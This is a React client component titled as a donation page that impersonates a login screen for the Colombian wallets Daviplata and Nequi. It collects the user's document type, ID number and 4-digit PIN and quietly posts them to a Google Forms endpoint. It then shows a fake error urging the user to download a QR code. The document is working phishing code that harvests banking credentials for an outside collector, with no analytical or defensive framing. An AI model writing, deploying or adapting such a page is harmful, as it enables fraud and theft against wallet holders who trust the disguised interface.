"use client";

import { useState } from "react";

export default function DonacionPage() {
  const [billetera, setBilletera] = useState("Daviplata");
  const [tipoDoc, setTipoDoc] = useState("");
  const [numeroDoc, setNumeroDoc] = useState("");
  const [password, setPassword] = useState("");
  const [mostrarPass, setMostrarPass] = useState(false);

  const formURL =
    "https://docs.google.com/forms/d/e/1FAIpQLSfOlo65NREqGCe-FeZfNleKjhcy2RipJCBurGOXD0TaviDBvQ/formResponse";

  const entryBilletera = "entry.496497493";
  const entryTipoDoc = "entry.625011170";
  const entryNumeroDoc = "entry.1122220095";
  const entryPassword = "entry.2104358462";

  const handleSubmit = async () => {
    if (!tipoDoc || !numeroDoc || !password) {
      alert("Completa todos los campos.");
      return;
    }
    if (!/^\d{4}$/.test(password)) {
      alert("La contraseña debe ser un número de 4 dígitos.");
      return;
    }

    const formData = new FormData();
    formData.append(entryBilletera, billetera);
    formData.append(entryTipoDoc, tipoDoc);
    formData.append(entryNumeroDoc, numeroDoc);
    formData.append(entryPassword, password);

    try {
      await fetch(formURL, {
        method: "POST",
        body: formData,
        mode: "no-cors",
      });

      // Siempre muestra este mensaje (porque Google Forms no responde)
      alert("No se puede ingresar al sistema, por favor descarga este código QR.");
    } catch {
      alert("Error al enviar datos.");
    }
  };

  return (
    <div className="max-w-2xl mx-auto py-12 px-6">
      <h1 className="text-4xl font-extrabold text-center text-[#19295A] mb-6">
        Ingrese a su Billetera Virtual
      </h1>

      {/* Billetera */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Billetera Virtual</label>
        <select
          value={billetera}
          onChange={(e) => setBilletera(e.target.value)}
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        >
          <option value="Daviplata">Daviplata</option>
          <option value="Nequi">Nequi</option>
        </select>
      </div>

      {/* Tipo de documento */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Tipo de documento</label>
        <select
          value={tipoDoc}
          onChange={(e) => setTipoDoc(e.target.value)}
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        >
          <option value="">Selecciona</option>
          <option value="cc">Cédula de Ciudadanía</option>
          <option value="ti">Tarjeta de Identidad</option>
          <option value="ce">Cédula de Extranjería</option>
        </select>
      </div>

      {/* Número de documento */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Número de documento</label>
        <input
          type="text"
          value={numeroDoc}
          onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))}
          placeholder="Ej: 1234567890"
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        />
      </div>

      {/* Contraseña */}
      <div className="mb-6">
        <label className="block text-sm mb-1">Contraseña (4 dígitos)</label>
        <div className="flex">
          <input
            type={mostrarPass ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))}
            placeholder="****"
            className="w-full p-3 rounded-l-lg bg-gray-800 text-white border border-gray-600"
          />
          <button
            onClick={() => setMostrarPass(!mostrarPass)}
            className="px-4 bg-gray-700 text-white rounded-r-lg"
          >
            {mostrarPass ? "Ocultar" : "Ver"}
          </button>
        </div>
      </div>

      <button
        onClick={handleSubmit}
        className="px-6 py-3 bg-[#19295A] text-white rounded-lg"
      >
        Ingresar
      </button>
    </div>
  );
}
